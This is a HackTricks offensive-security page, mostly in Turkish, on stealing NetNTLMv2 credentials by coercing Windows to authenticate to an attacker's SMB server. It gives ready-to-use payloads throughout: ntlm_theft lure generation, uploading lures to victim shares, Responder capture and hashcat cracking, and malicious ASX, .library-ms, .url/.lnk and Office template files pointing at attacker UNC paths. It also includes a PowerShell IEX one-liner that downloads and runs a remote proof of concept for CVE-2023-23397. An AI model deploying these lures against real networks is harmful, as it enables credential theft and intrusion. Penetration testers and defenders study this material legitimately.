# NTLM creds çalmak için yerler

{{#include ../../banners/hacktricks-training.md}}

**Tüm harika fikirleri şu kaynaktan inceleyin: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — çevrimiçi bir microsoft word dosyasının indirilmesinden ntlm leaks kaynağına kadar: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md ve [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Yazılabilir SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Eğer kullanıcıların veya zamanlanmış işlerin Explorer'da göz attığı bir paylaşıma **yazabiliyorsanız**, metadata'sı UNC'nize işaret eden dosyalar bırakın (örn. `\\ATTACKER\share`). Klasörün gösterilmesi **implicit SMB authentication** tetikler ve listener'ınıza **NetNTLMv2** leaks.

1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Bunları yazılabilir paylaşıma bırakın** (kurbanın açtığı herhangi bir klasör):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Dinle ve crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows aynı anda birden fazla dosyaya erişebilir; Explorer'ın önizlediği herhangi bir şey (`BROWSE TO FOLDER`) tıklama gerektirmez.

### Windows Media Player çalma listeleri (.ASX/.WAX)

Hedefin kontrolünüzdeki bir Windows Media Player çalma listesini açmasını veya önizlemesini sağlayabilirseniz, girdiyi bir UNC yoluna yönlendirerek Net‑NTLMv2 leak edebilirsiniz. WMP, referans verilen medyayı SMB üzerinden almaya çalışacak ve otomatik olarak kimlik doğrulaması yapacaktır.

Örnek payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Toplama ve cracking akışı:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP içinde gömülü .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, bir ZIP arşivinin içinden doğrudan açıldığında .library-ms dosyalarını güvensiz şekilde işler. Eğer library tanımı uzak bir UNC yoluna (ör. \\attacker\share) işaret ediyorsa, ZIP içindeki .library-ms'ye göz atmak/başlatmak Explorer'ın UNC'yi listelemesine ve saldırgana NTLM kimlik doğrulaması göndermesine neden olur. Bu, offline olarak kırılabilecek veya potansiyel olarak relay yapılabilecek bir NetNTLMv2 üretir.

Saldırgan UNC'sine işaret eden minimal .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- .library-ms dosyasını yukarıdaki XML ile oluşturun (IP/hostname ayarını yapın).
- ZIPleyin (Windows'ta: Send to → Compressed (zipped) folder) ve ZIP'i hedefe teslim edin.
- Bir NTLM capture listener çalıştırın ve kurbanın ZIP içinden .library-ms dosyasını açmasını bekleyin.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows, takvim öğelerindeki genişletilmiş MAPI özelliği PidLidReminderFileParameter'ı işler. Eğer bu özellik bir UNC yoluna işaret ediyorsa (ör. \\attacker\share\alert.wav), hatırlatma tetiklendiğinde Outlook SMB paylaşımıyla iletişim kurar, leaking the user’s Net‑NTLMv2 without any click. Bu durum 14 Mart 2023'te yamalandı, ancak güncellenmemiş/eski filolar ve geçmiş olay müdahaleleri için hâlâ yüksek derecede önemlidir.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener tarafı:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notlar
- Kurbandan, hatırlatıcı tetiklendiğinde yalnızca Outlook for Windows'un çalışıyor olması yeterlidir.
- Bu leak, Net‑NTLMv2 sağlar; offline cracking veya relay için uygundur (pass‑the‑hash değil).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer kısayol simgelerini otomatik olarak görüntüler. Son araştırmalar, Microsoft’ün UNC‑icon kısayollarına yönelik Nisan 2025 yamasından sonra bile, kısayol hedefini bir UNC yolunda barındırıp simgeyi yerel tutarak tıklama olmadan NTLM kimlik doğrulaması tetiklemenin mümkün olduğunu gösterdi (yama baypasına CVE‑2025‑50154 atandı). Klasörü yalnızca görüntülemek bile Explorer'ın uzak hedeften meta verileri almasına neden olur ve NTLM'i saldırganın SMB sunucusuna gönderir.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Kısayolu payload (.lnk) PowerShell ile:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Kısayolu bir ZIP içine koyun ve hedefin göz atmasını sağlayın.
- Kısayolu hedefin açacağı yazılabilir bir paylaşıma yerleştirin.
- Explorer öğeleri önizlediği için aynı klasörde diğer tuzak dosyalarla birleştirin.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows loads `.lnk` metadata during **view/preview** (icon rendering), not only on execution. CVE‑2026‑25185 shows a parsing path where **ExtraData** blocks cause the shell to resolve an icon path and touch the filesystem **during load**, emitting outbound NTLM when the path is remote.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- ExtraData içinde **DARWIN_PROPS** (`0xa0000006`) bulunmalıdır (ikon güncelleme rutinine geçit).
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) eklenmiş ve **TargetUnicode** doldurulmuş olmalı.
- Yükleyici, `TargetUnicode` içindeki ortam değişkenlerini genişletir ve ortaya çıkan yolda `PathFileExistsW` çağrısı yapar.

If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **merely viewing a folder** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no‑click leak surface.

Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels dosyasını düzenleyin ve rId1337'i UNC'nize yönlendirin:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx olarak yeniden paketleyin ve teslim edin. SMB capture listener'ınızı çalıştırın ve open'ı bekleyin.

Yakalama sonrası relaying veya abusing NTLM ile ilgili fikirler için bakın:

{{#ref}}
README.md
{{#endref}}


## Referanslar
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
